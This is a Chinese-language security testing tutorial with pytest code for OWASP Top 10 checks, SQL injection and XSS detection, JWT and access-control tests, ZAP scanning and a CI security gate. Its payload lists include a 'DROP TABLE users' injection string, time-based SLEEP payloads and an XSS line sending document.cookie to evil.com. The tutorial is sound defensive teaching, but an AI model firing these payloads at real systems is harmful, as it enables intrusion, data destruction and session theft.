# 安全测试 三层深度学习教程

## [总览] 技术总览

安全测试识别系统漏洞和安全风险，确保应用抵御恶意攻击。它涵盖漏洞扫描、渗透测试、代码审计、安全配置检查等多个方面，是软件开发生命周期中不可或缺的环节。

本教程采用三层漏斗学习法：**核心层**聚焦 OWASP Top 10、SQL 注入测试、XSS 测试三大基石；**重点层**深入认证测试和自动化安全扫描；**扩展层**仅作关键词索引。

---

## [核心] 第一部分：核心层（20% 基石内容）

### 1. OWASP Top 10 漏洞

#### [概念] 概念解释

OWASP Top 10 是 Web 应用最常见的安全风险列表：注入攻击、失效的身份认证、敏感数据泄露、XML 外部实体、失效的访问控制、安全配置错误、跨站脚本（XSS）、不安全的反序列化、使用含有已知漏洞的组件、日志与监控不足。

#### [代码] 代码示例

```python
# OWASP Top 10 安全测试示例
import pytest
import requests
from typing import Dict, List
import re

class OWASPScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities: List[Dict] = []
    
    def report_vulnerability(self, vuln_type: str, severity: str, description: str, url: str):
        self.vulnerabilities.append({
            "type": vuln_type,
            "severity": severity,
            "description": description,
            "url": url
        })

class TestOWASPTop10:
    
    @pytest.fixture
    def scanner(self):
        return OWASPScanner("https://example.com")
    
    def test_security_headers(self, scanner):
        """测试安全响应头"""
        response = requests.get(scanner.base_url)
        headers = response.headers
        
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": None,
            "Content-Security-Policy": None
        }
        
        for header, expected in required_headers.items():
            if header not in headers:
                scanner.report_vulnerability(
                    "Missing Security Header",
                    "Medium",
                    f"Missing {header} header",
                    scanner.base_url
                )
    
    def test_sensitive_data_exposure(self, scanner):
        """测试敏感数据泄露"""
        response = requests.get(scanner.base_url)
        content = response.text
        
        sensitive_patterns = [
            (r'\b\d{16}\b', "Credit Card Number"),
            (r'\b\d{3}-\d{2}-\d{4}\b', "SSN"),
            (r'password\s*[=:]\s*\S+', "Password in Response"),
            (r'api[_-]?key\s*[=:]\s*\S+', "API Key"),
        ]
        
        for pattern, desc in sensitive_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                scanner.report_vulnerability(
                    "Sensitive Data Exposure",
                    "High",
                    f"Potential {desc} found in response",
                    scanner.base_url
                )
    
    def test_error_disclosure(self, scanner):
        """测试错误信息泄露"""
        test_urls = [
            f"{scanner.base_url}/nonexistent",
            f"{scanner.base_url}/?id='",
            f"{scanner.base_url}/?id=<script>",
        ]
        
        for url in test_urls:
            response = requests.get(url)
            content = response.text.lower()
            
            error_indicators = [
                "stack trace",
                "exception",
                "syntax error",
                "debug info",
                "/var/www/",
                "c:\\users\\"
            ]
            
            for indicator in error_indicators:
                if indicator in content:
                    scanner.report_vulnerability(
                        "Information Disclosure",
                        "Medium",
                        f"Error information exposed: {indicator}",
                        url
                    )
```

### 2. SQL 注入测试

#### [概念] 概念解释

SQL 注入是攻击者通过输入恶意 SQL 语句操纵数据库查询。测试方法包括：基于错误的注入、布尔盲注、时间盲注、联合查询注入。防御措施包括参数化查询、输入验证、最小权限原则。

#### [代码] 代码示例

```python
# SQL 注入测试
import pytest
import requests
import time
from typing import List, Tuple

class SQLInjectionTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> List[str]:
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1; DROP TABLE users--",
            "admin'--",
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
        ]
    
    def test_error_based(self, endpoint: str, param: str) -> List[dict]:
        """基于错误的 SQL 注入测试"""
        results = []
        
        for payload in self.payloads[:6]:
            url = f"{self.base_url}{endpoint}?{param}={payload}"
            try:
                response = requests.get(url, timeout=10)
                
                error_patterns = [
                    "sql syntax",
                    "mysql_fetch",
                    "ORA-",
                    "PLS-",
                    "Unclosed quotation mark",
                    "quoted string not properly terminated",
                ]
                
                for pattern in error_patterns:
                    if pattern.lower() in response.text.lower():
                        results.append({
                            "payload": payload,
                            "vulnerable": True,
                            "evidence": pattern
                        })
                        break
            except requests.RequestException:
                pass
        
        return results
    
    def test_boolean_blind(self, endpoint: str, param: str) -> bool:
        """布尔盲注测试"""
        true_payload = "' AND 1=1--"
        false_payload = "' AND 1=2--"
        
        true_url = f"{self.base_url}{endpoint}?{param}=1{true_payload}"
        false_url = f"{self.base_url}{endpoint}?{param}=1{false_payload}"
        
        try:
            true_response = requests.get(true_url, timeout=10)
            false_response = requests.get(false_url, timeout=10)
            
            if true_response.text != false_response.text:
                return True
        except requests.RequestException:
            pass
        
        return False
    
    def test_time_based(self, endpoint: str, param: str) -> bool:
        """时间盲注测试"""
        payload = "' AND SLEEP(5)--"
        url = f"{self.base_url}{endpoint}?{param}=1{payload}"
        
        try:
            start = time.time()
            requests.get(url, timeout=15)
            elapsed = time.time() - start
            
            if elapsed >= 5:
                return True
        except requests.RequestException:
            pass
        
        return False

class TestSQLInjection:
    
    @pytest.fixture
    def tester(self):
        return SQLInjectionTester("https://example.com")
    
    def test_login_sql_injection(self, tester):
        """测试登录接口 SQL 注入"""
        results = tester.test_error_based("/login", "username")
        
        vulnerable_payloads = [r for r in results if r["vulnerable"]]
        assert len(vulnerable_payloads) == 0, f"SQL Injection found: {vulnerable_payloads}"
    
    def test_search_boolean_blind(self, tester):
        """测试搜索接口布尔盲注"""
        is_vulnerable = tester.test_boolean_blind("/search", "q")
        assert not is_vulnerable, "Boolean-based blind SQL Injection found"
    
    def test_product_time_based(self, tester):
        """测试产品接口时间盲注"""
        is_vulnerable = tester.test_time_based("/products", "id")
        assert not is_vulnerable, "Time-based blind SQL Injection found"

# 安全代码示例
class SecureDatabase:
    """安全的数据库操作"""
    
    def __init__(self, connection):
        self.conn = connection
    
    def get_user_by_id(self, user_id: int):
        """使用参数化查询"""
        cursor = self.conn.cursor()
        cursor.execute(
            "SELECT * FROM users WHERE id = %s",
            (user_id,)
        )
        return cursor.fetchone()
    
    def search_users(self, name: str):
        """安全的模糊搜索"""
        cursor = self.conn.cursor()
        cursor.execute(
            "SELECT * FROM users WHERE name LIKE %s",
            (f"%{name}%",)
        )
        return cursor.fetchall()
    
    def validate_input(self, value: str, max_length: int = 100) -> str:
        """输入验证"""
        if not isinstance(value, str):
            raise ValueError("Invalid input type")
        if len(value) > max_length:
            raise ValueError("Input too long")
        return value.strip()
```

### 3. XSS 跨站脚本测试

#### [概念] 概念解释

XSS（Cross-Site Scripting）攻击者注入恶意脚本到网页，在用户浏览器执行。类型包括：反射型 XSS、存储型 XSS、DOM 型 XSS。防御措施包括输出编码、内容安全策略、输入验证。

#### [代码] 代码示例

```python
# XSS 测试
import pytest
import requests
from typing import List
import html

class XSSTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "'\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
        ]
    
    def test_reflected_xss(self, endpoint: str, param: str) -> List[dict]:
        """反射型 XSS 测试"""
        results = []
        
        for payload in self.payloads:
            url = f"{self.base_url}{endpoint}?{param}={requests.utils.quote(payload)}"
            
            try:
                response = requests.get(url, timeout=10)
                
                if payload in response.text or "alert" in response.text:
                    results.append({
                        "payload": payload,
                        "vulnerable": True,
                        "context": self._find_context(response.text, payload)
                    })
            except requests.RequestException:
                pass
        
        return results
    
    def _find_context(self, html_content: str, payload: str) -> str:
        """查找注入上下文"""
        if "<script>" in html_content.lower():
            return "script tag"
        elif "onerror=" in html_content.lower():
            return "event handler"
        elif payload in html_content:
            return "raw HTML"
        return "unknown"
    
    def test_stored_xss(self, endpoint: str, data: dict, display_endpoint: str) -> bool:
        """存储型 XSS 测试"""
        test_payload = "<script>document.write('XSSTEST')</script>"
        data_copy = data.copy()
        
        for key in data_copy:
            data_copy[key] = test_payload
        
        try:
            requests.post(f"{self.base_url}{endpoint}", json=data_copy)
            response = requests.get(f"{self.base_url}{display_endpoint}")
            
            if "XSSTEST" in response.text:
                return True
        except requests.RequestException:
            pass
        
        return False

class TestXSS:
    
    @pytest.fixture
    def tester(self):
        return XSSTester("https://example.com")
    
    def test_search_xss(self, tester):
        """测试搜索反射型 XSS"""
        results = tester.test_reflected_xss("/search", "q")
        vulnerable = [r for r in results if r["vulnerable"]]
        assert len(vulnerable) == 0, f"XSS vulnerabilities found: {vulnerable}"
    
    def test_comment_stored_xss(self, tester):
        """测试评论存储型 XSS"""
        is_vulnerable = tester.test_stored_xss(
            "/comments",
            {"content": "test"},
            "/comments"
        )
        assert not is_vulnerable, "Stored XSS vulnerability found"

# XSS 防御代码
class XSSProtection:
    """XSS 防护工具"""
    
    @staticmethod
    def escape_html(text: str) -> str:
        """HTML 实体编码"""
        return html.escape(text, quote=True)
    
    @staticmethod
    def sanitize_html(html_content: str, allowed_tags: List[str] = None) -> str:
        """HTML 清理"""
        from bs4 import BeautifulSoup
        
        if allowed_tags is None:
            allowed_tags = ['p', 'br', 'strong', 'em', 'u']
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for tag in soup.find_all(True):
            if tag.name not in allowed_tags:
                tag.unwrap()
            else:
                for attr in list(tag.attrs):
                    if attr.startswith('on') or attr == 'href' and tag.name == 'a':
                        del tag[attr]
        
        return str(soup)
    
    @staticmethod
    def generate_csp_header() -> str:
        """生成 CSP 头"""
        return (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "frame-ancestors 'none';"
        )

# FastAPI 安全中间件
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Content-Security-Policy"] = XSSProtection.generate_csp_header()
    
    return response
```

---

## [重点] 第二部分：重点层（20% 进阶内容）

### 1. 认证与授权测试

#### [概念] 概念解释

认证测试验证身份验证机制的安全性，包括密码策略、会话管理、多因素认证。授权测试验证访问控制是否正确实施，防止越权访问。

#### [代码] 代码示例

```python
# 认证与授权测试
import pytest
import requests
import jwt
from datetime import datetime, timedelta
from typing import Dict, Optional

class AuthTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
    
    def test_weak_passwords(self, username: str, passwords: list) -> dict:
        """测试弱密码"""
        results = {"success": [], "failed": []}
        
        for password in passwords:
            response = self.session.post(
                f"{self.base_url}/login",
                json={"username": username, "password": password}
            )
            
            if response.status_code == 200:
                results["success"].append(password)
            else:
                results["failed"].append(password)
        
        return results
    
    def test_session_fixation(self) -> bool:
        """测试会话固定攻击"""
        login_response = self.session.get(f"{self.base_url}/login")
        pre_session = login_response.cookies.get("session_id")
        
        self.session.post(
            f"{self.base_url}/login",
            json={"username": "test", "password": "test123"}
        )
        
        post_session = self.session.cookies.get("session_id")
        
        return pre_session == post_session
    
    def test_jwt_security(self, token: str) -> Dict:
        """测试 JWT 安全性"""
        results = {}
        
        try:
            header = jwt.get_unverified_header(token)
            results["algorithm"] = header.get("alg")
            
            if header.get("alg") == "none":
                results["vulnerability"] = "Algorithm 'none' accepted"
            
            if header.get("alg") == "HS256":
                try:
                    jwt.decode(token, options={"verify_signature": False})
                    results["vulnerability"] = "Token accepted without signature verification"
                except jwt.InvalidSignatureError:
                    pass
            
            payload = jwt.decode(token, options={"verify_signature": False})
            results["payload"] = payload
            
            if "exp" not in payload:
                results["warning"] = "No expiration time"
            
        except jwt.DecodeError as e:
            results["error"] = str(e)
        
        return results
    
    def test_horizontal_access(self, token1: str, token2: str, resource: str) -> bool:
        """测试水平越权"""
        headers1 = {"Authorization": f"Bearer {token1}"}
        headers2 = {"Authorization": f"Bearer {token2}"}
        
        response1 = requests.get(
            f"{self.base_url}{resource}",
            headers=headers1
        )
        
        response2 = requests.get(
            f"{self.base_url}{resource}",
            headers=headers2
        )
        
        if response1.status_code == 200 and response2.status_code == 200:
            if response1.json() == response2.json():
                return True
        
        return False
    
    def test_vertical_access(self, user_token: str, admin_endpoint: str) -> bool:
        """测试垂直越权"""
        headers = {"Authorization": f"Bearer {user_token}"}
        
        response = requests.get(
            f"{self.base_url}{admin_endpoint}",
            headers=headers
        )
        
        return response.status_code == 200

class TestAuthentication:
    
    @pytest.fixture
    def tester(self):
        return AuthTester("https://example.com")
    
    def test_common_passwords(self, tester):
        """测试常见弱密码"""
        common_passwords = [
            "password", "123456", "admin", "qwerty",
            "letmein", "welcome", "monkey", "dragon"
        ]
        
        results = tester.test_weak_passwords("admin", common_passwords)
        assert len(results["success"]) == 0, f"Weak passwords accepted: {results['success']}"
    
    def test_session_regeneration(self, tester):
        """测试会话重新生成"""
        is_vulnerable = tester.test_session_fixation()
        assert not is_vulnerable, "Session fixation vulnerability found"
    
    def test_jwt_implementation(self, tester):
        """测试 JWT 实现"""
        test_token = jwt.encode(
            {"user_id": 1, "exp": datetime.utcnow() + timedelta(hours=1)},
            "secret",
            algorithm="HS256"
        )
        
        results = tester.test_jwt_security(test_token)
        assert "vulnerability" not in results, f"JWT vulnerability: {results['vulnerability']}"
```

### 2. 自动化安全扫描

#### [概念] 概念解释

自动化安全扫描工具能快速发现常见漏洞。常用工具包括 OWASP ZAP、Burp Suite、Nessus 等。将安全扫描集成到 CI/CD 流程实现持续安全。

#### [代码] 代码示例

```python
# 自动化安全扫描集成
import subprocess
import json
import xml.etree.ElementTree as ET
from typing import List, Dict
from dataclasses import dataclass
import pytest

@dataclass
class Vulnerability:
    severity: str
    title: str
    description: str
    url: str
    solution: str

class ZAPScanner:
    """OWASP ZAP 自动化扫描"""
    
    def __init__(self, zap_url: str = "http://localhost:8080"):
        self.zap_url = zap_url
        self.api_key = "test-api-key"
    
    def start_scan(self, target_url: str) -> str:
        """启动扫描"""
        import requests
        
        response = requests.get(
            f"{self.zap_url}/JSON/spider/action/scan/",
            params={
                "url": target_url,
                "apikey": self.api_key
            }
        )
        
        return response.json()["scan"]
    
    def get_scan_status(self, scan_id: str) -> int:
        """获取扫描进度"""
        import requests
        
        response = requests.get(
            f"{self.zap_url}/JSON/spider/view/status/",
            params={"scanId": scan_id}
        )
        
        return int(response.json()["status"])
    
    def get_alerts(self, base_url: str) -> List[Vulnerability]:
        """获取扫描结果"""
        import requests
        
        response = requests.get(
            f"{self.zap_url}/JSON/alert/view/alerts/",
            params={
                "baseurl": base_url,
                "apikey": self.api_key
            }
        )
        
        alerts = []
        for alert in response.json().get("alerts", []):
            alerts.append(Vulnerability(
                severity=alert.get("risk", "Unknown"),
                title=alert.get("alert", ""),
                description=alert.get("description", ""),
                url=alert.get("url", ""),
                solution=alert.get("solution", "")
            ))
        
        return alerts

class SecurityReport:
    """安全报告生成"""
    
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
    
    def add_vulnerability(self, vuln: Vulnerability):
        self.vulnerabilities.append(vuln)
    
    def get_summary(self) -> Dict:
        severity_counts = {}
        for vuln in self.vulnerabilities:
            severity_counts[vuln.severity] = severity_counts.get(vuln.severity, 0) + 1
        
        return {
            "total": len(self.vulnerabilities),
            "by_severity": severity_counts,
            "critical": severity_counts.get("High", 0) + severity_counts.get("Critical", 0)
        }
    
    def generate_html_report(self, filepath: str):
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Scan Report</title>
            <style>
                body {{ font-family: Arial; margin: 20px; }}
                .critical {{ background: #ff4444; color: white; }}
                .high {{ background: #ff8800; color: white; }}
                .medium {{ background: #ffcc00; }}
                .low {{ background: #88cc00; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            </style>
        </head>
        <body>
            <h1>Security Scan Report</h1>
            <h2>Summary</h2>
            <p>Total Vulnerabilities: {len(self.vulnerabilities)}</p>
            
            <h2>Details</h2>
            <table>
                <tr>
                    <th>Severity</th>
                    <th>Title</th>
                    <th>URL</th>
                    <th>Description</th>
                </tr>
                {''.join([f'''
                <tr class="{v.severity.lower()}">
                    <td>{v.severity}</td>
                    <td>{v.title}</td>
                    <td>{v.url}</td>
                    <td>{v.description[:100]}...</td>
                </tr>
                ''' for v in self.vulnerabilities])}
            </table>
        </body>
        </html>
        """
        
        with open(filepath, 'w') as f:
            f.write(html)

class TestSecurityScan:
    
    @pytest.fixture
    def scanner(self):
        return ZAPScanner()
    
    @pytest.mark.security
    def test_full_security_scan(self, scanner):
        """完整安全扫描"""
        scan_id = scanner.start_scan("https://example.com")
        
        import time
        while scanner.get_scan_status(scan_id) < 100:
            time.sleep(5)
        
        alerts = scanner.get_alerts("https://example.com")
        
        critical_alerts = [a for a in alerts if a.severity in ["High", "Critical"]]
        assert len(critical_alerts) == 0, f"Critical vulnerabilities found: {critical_alerts}"
```

### 3. 安全测试最佳实践

#### [概念] 概念解释

安全测试应贯穿整个开发生命周期：需求阶段进行威胁建模、开发阶段进行代码审计、测试阶段进行渗透测试、部署阶段进行配置检查。

#### [代码] 代码示例

```python
# 安全测试最佳实践
import re
from typing import List, Dict, Tuple
from dataclasses import dataclass
from enum import Enum

class Severity(Enum):
    CRITICAL = 4
    HIGH = 3
    MEDIUM = 2
    LOW = 1
    INFO = 0

@dataclass
class SecurityCheck:
    id: str
    name: str
    description: str
    severity: Severity
    check_function: callable

class SecurityChecklist:
    """安全检查清单"""
    
    def __init__(self):
        self.checks: List[SecurityCheck] = []
        self._register_default_checks()
    
    def _register_default_checks(self):
        self.checks = [
            SecurityCheck(
                id="SEC001",
                name="HTTPS Enforcement",
                description="Ensure all endpoints use HTTPS",
                severity=Severity.HIGH,
                check_function=self._check_https
            ),
            SecurityCheck(
                id="SEC002",
                name="Authentication Required",
                description="Sensitive endpoints require authentication",
                severity=Severity.CRITICAL,
                check_function=self._check_auth_required
            ),
            SecurityCheck(
                id="SEC003",
                name="Input Validation",
                description="All inputs are validated",
                severity=Severity.HIGH,
                check_function=self._check_input_validation
            ),
            SecurityCheck(
                id="SEC004",
                name="Rate Limiting",
                description="API endpoints have rate limiting",
                severity=Severity.MEDIUM,
                check_function=self._check_rate_limiting
            ),
            SecurityCheck(
                id="SEC005",
                name="Secure Cookies",
                description="Cookies use Secure and HttpOnly flags",
                severity=Severity.HIGH,
                check_function=self._check_secure_cookies
            ),
        ]
    
    def _check_https(self, url: str) -> Tuple[bool, str]:
        if url.startswith("https://"):
            return True, "HTTPS enabled"
        return False, "HTTP used instead of HTTPS"
    
    def _check_auth_required(self, endpoint: dict) -> Tuple[bool, str]:
        if endpoint.get("requires_auth", False):
            return True, "Authentication required"
        return False, "No authentication required"
    
    def _check_input_validation(self, code: str) -> Tuple[bool, str]:
        validation_patterns = [
            r'validate',
            r'sanitize',
            r'escape',
            r'clean',
        ]
        
        for pattern in validation_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                return True, "Input validation found"
        
        return False, "No input validation found"
    
    def _check_rate_limiting(self, response) -> Tuple[bool, str]:
        headers = getattr(response, 'headers', {})
        if 'X-RateLimit-Limit' in headers or 'RateLimit-Limit' in headers:
            return True, "Rate limiting headers present"
        return False, "No rate limiting detected"
    
    def _check_secure_cookies(self, cookie_header: str) -> Tuple[bool, str]:
        if 'Secure' in cookie_header and 'HttpOnly' in cookie_header:
            return True, "Secure cookie flags set"
        return False, "Missing Secure or HttpOnly flag"
    
    def run_checks(self, target) -> Dict:
        results = {
            "passed": [],
            "failed": [],
            "warnings": []
        }
        
        for check in self.checks:
            try:
                passed, message = check.check_function(target)
                result = {
                    "id": check.id,
                    "name": check.name,
                    "message": message
                }
                
                if passed:
                    results["passed"].append(result)
                else:
                    results["failed"].append({
                        **result,
                        "severity": check.severity.name
                    })
            except Exception as e:
                results["warnings"].append({
                    "id": check.id,
                    "name": check.name,
                    "error": str(e)
                })
        
        return results

# CI/CD 集成示例
class CISecurityGate:
    """CI/CD 安全门禁"""
    
    def __init__(self, fail_on: List[Severity] = None):
        self.fail_on = fail_on or [Severity.CRITICAL, Severity.HIGH]
        self.checklist = SecurityChecklist()
    
    def run_gate(self, target) -> bool:
        results = self.checklist.run_checks(target)
        
        for failed in results["failed"]:
            severity = Severity[failed["severity"]]
            if severity in self.fail_on:
                print(f"SECURITY GATE FAILED: {failed['name']}")
                return False
        
        print("SECURITY GATE PASSED")
        return True
```

---

## [扩展] 第三部分：扩展层（60% 广度索引）

| 关键词 | 场景提示 |
|--------|----------|
| CSRF | 跨站请求伪造，Token 验证 |
| SSRF | 服务端请求伪造，内网访问 |
| XXE | XML 外部实体，文件读取 |
| IDOR | 不安全的直接对象引用 |
| RCE | 远程代码执行漏洞 |
| Buffer Overflow | 缓冲区溢出攻击 |
| Cryptography | 加密算法安全测试 |
| Penetration Testing | 渗透测试方法论 |
| Threat Modeling | 威胁建模，STRIDE |
| SAST/DAST | 静态/动态应用安全测试 |
